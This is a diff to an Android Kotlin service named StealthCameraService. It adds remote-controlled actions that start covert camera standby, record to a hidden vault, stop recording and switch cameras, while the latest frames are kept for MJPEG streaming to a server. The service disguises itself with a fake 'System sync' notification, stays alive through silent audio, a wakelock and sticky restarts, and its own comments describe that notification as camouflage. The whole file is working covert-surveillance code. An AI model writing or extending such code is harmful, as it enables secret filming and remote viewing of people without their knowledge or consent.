@@ -39,13 +39,22 @@ class StealthCameraService : LifecycleService() {
     private lateinit var cameraExecutor: ExecutorService
     private var videoCapture: VideoCapture<Recorder>? = null
     private var recording: Recording? = null
+    private var cameraProvider: ProcessCameraProvider? = null
 
     private lateinit var vaultManager: VaultManager
+    private var currentLensFacing = CameraSelector.LENS_FACING_BACK
+    private var isCameraInitialized = false
 
-    // サーバーがいつでも最新の映像フレームを取得できるように保存しておく共有領域
     companion object {
+        // MJPEG配信用に最新フレームを保持
         @Volatile
         var latestJpeg: ByteArray? = null
+
+        // 外部（サーバーなど）から操作するためのアクション定義
+        const val ACTION_START_STANDBY = "ACTION_START_STANDBY"
+        const val ACTION_START_RECORDING = "ACTION_START_RECORDING"
+        const val ACTION_STOP_RECORDING = "ACTION_STOP_RECORDING"
+        const val ACTION_SWITCH_CAMERA = "ACTION_SWITCH_CAMERA"
     }
 
     override fun onCreate() {
@@ -60,19 +69,31 @@ class StealthCameraService : LifecycleService() {
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         super.onStartCommand(intent, flags, startId)
 
-        // すでに録画中の場合は停止してサービスを終了する（トグル動作）
-        if (recording != null) {
-            recording?.stop()
-            recording = null
-            stopSelf()
-            return START_NOT_STICKY
+        // 送られてきたアクションに応じて処理を分岐
+        when (intent?.action) {
+            ACTION_START_STANDBY -> {
+                if (!isCameraInitialized) {
+                    startCamera(currentLensFacing)
+                    isCameraInitialized = true
+                }
+            }
+            ACTION_START_RECORDING -> {
+                startRecordingToVault()
+            }
+            ACTION_STOP_RECORDING -> {
+                stopRecordingToVault()
+            }
+            ACTION_SWITCH_CAMERA -> {
+                switchCamera()
+            }
+            else -> {
+                // デフォルトの起動時（指定なし）もカメラをスタンバイ状態にしておく
+                if (!isCameraInitialized) {
+                    startCamera(currentLensFacing)
+                    isCameraInitialized = true
+                }
+            }
         }
-
-        // MainActivityから送られた内カメ/外カメのフラグを取得（デフォルトは外カメ）
-        val facing = intent?.getIntExtra("EXTRA_CAMERA_FACING", CameraSelector.LENS_FACING_BACK) ?: CameraSelector.LENS_FACING_BACK
-        startCamera(facing)
-
-        // サービスがOSにKillされても自動で再起動を試みる
         return START_STICKY
     }
 
@@ -120,7 +141,6 @@ class StealthCameraService : LifecycleService() {
             val manager = getSystemService(NotificationManager::class.java)
             manager.createNotificationChannel(channel)
         }
-        // カモフラージュ用のシステム通知
         val notification: Notification = NotificationCompat.Builder(this, channelId)
             .setContentTitle("システム同期")
             .setContentText("バックグラウンドでデータを同期しています")
@@ -133,15 +153,13 @@ class StealthCameraService : LifecycleService() {
     private fun startCamera(lensFacing: Int) {
         val cameraProviderFuture = ProcessCameraProvider.getInstance(this)
         cameraProviderFuture.addListener({
-            val cameraProvider = cameraProviderFuture.get()
+            cameraProvider = cameraProviderFuture.get()
             
-            // 1. 録画用の設定
             val recorder = Recorder.Builder()
                 .setQualitySelector(QualitySelector.from(Quality.HD))
                 .build()
             videoCapture = VideoCapture.withOutput(recorder)
 
-            // 2. プレビュー配信（ストリーミング）用の映像解析設定を追加
             val imageAnalysis = ImageAnalysis.Builder()
                 .setOutputImageFormat(ImageAnalysis.OUTPUT_IMAGE_FORMAT_RGBA_8888)
                 .setBackpressureStrategy(ImageAnalysis.STRATEGY_KEEP_ONLY_LATEST)
@@ -149,16 +167,13 @@ class StealthCameraService : LifecycleService() {
 
             imageAnalysis.setAnalyzer(cameraExecutor) { imageProxy ->
                 try {
-                    // 映像をBitmapに変換
                     val bitmap = Bitmap.createBitmap(imageProxy.width, imageProxy.height, Bitmap.Config.ARGB_8888)
                     bitmap.copyPixelsFromBuffer(imageProxy.planes[0].buffer)
 
-                    // カメラの向きに合わせて画像を回転
                     val matrix = Matrix()
                     matrix.postRotate(imageProxy.imageInfo.rotationDegrees.toFloat())
                     val rotatedBitmap = Bitmap.createBitmap(bitmap, 0, 0, bitmap.width, bitmap.height, matrix, true)
 
-                    // JPEGに圧縮して共有変数に保存（画質40で通信速度を優先）
                     val out = ByteArrayOutputStream()
                     rotatedBitmap.compress(Bitmap.CompressFormat.JPEG, 40, out)
                     latestJpeg = out.toByteArray()
@@ -172,10 +187,10 @@ class StealthCameraService : LifecycleService() {
             val cameraSelector = CameraSelector.Builder().requireLensFacing(lensFacing).build()
 
             try {
-                cameraProvider.unbindAll()
-                // 録画(videoCapture)とプレビュー配信(imageAnalysis)を同時に動かす
-                cameraProvider.bindToLifecycle(this, cameraSelector, videoCapture, imageAnalysis)
-                startRecording()
+                cameraProvider?.unbindAll()
+                cameraProvider?.bindToLifecycle(this, cameraSelector, videoCapture, imageAnalysis)
+                // ★修正点：ここでは startRecording() を呼ばず、ストリーミング用のスタンバイ状態にする
+                Log.d("StealthCameraService", "Camera started in STANDBY mode")
             } catch (exc: Exception) {
                 Log.e("StealthCameraService", "Camera binding failed", exc)
                 stopSelf()
@@ -183,8 +198,23 @@ class StealthCameraService : LifecycleService() {
         }, ContextCompat.getMainExecutor(this))
     }
 
+    private fun switchCamera() {
+        currentLensFacing = if (currentLensFacing == CameraSelector.LENS_FACING_BACK) {
+            CameraSelector.LENS_FACING_FRONT
+        } else {
+            CameraSelector.LENS_FACING_BACK
+        }
+        // カメラの向きを変えるには一度バインドを解除して再起動が必要（録画中の場合は自動で停止される）
+        stopRecordingToVault()
+        startCamera(currentLensFacing)
+    }
+
     @SuppressLint("MissingPermission")
-    private fun startRecording() {
+    private fun startRecordingToVault() {
+        if (recording != null) {
+            Log.d("StealthCameraService", "Already recording to Vault")
+            return
+        }
         val videoCapture = this.videoCapture ?: return
         val tempFile = vaultManager.createTempVideoFile()
         val outputOptions = FileOutputOptions.Builder(tempFile).build()
@@ -194,7 +224,7 @@ class StealthCameraService : LifecycleService() {
             .start(ContextCompat.getMainExecutor(this)) { recordEvent ->
                 when (recordEvent) {
                     is VideoRecordEvent.Start -> {
-                        Log.d("StealthCameraService", "Recording started")
+                        Log.d("StealthCameraService", "Recording to Vault started")
                     }
                     is VideoRecordEvent.Finalize -> {
                         if (!recordEvent.hasError()) {
@@ -205,23 +235,27 @@ class StealthCameraService : LifecycleService() {
                             Log.e("StealthCameraService", "Recording error: ${recordEvent.error}")
                         }
                     }
-                    else -> {
-                    }
+                    else -> {}
                 }
             }
     }
 
-    override fun onDestroy() {
-        super.onDestroy()
+    private fun stopRecordingToVault() {
         recording?.stop()
         recording = null
+        Log.d("StealthCameraService", "Recording to Vault stopped")
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        stopRecordingToVault()
         cameraExecutor.shutdown()
 
         isPlayingSilence = false
         audioTrack?.stop()
         audioTrack?.release()
         
-        latestJpeg = null // 終了時に画像キャッシュもクリア
+        latestJpeg = null
 
         wakeLock?.let {
             if (it.isHeld) {
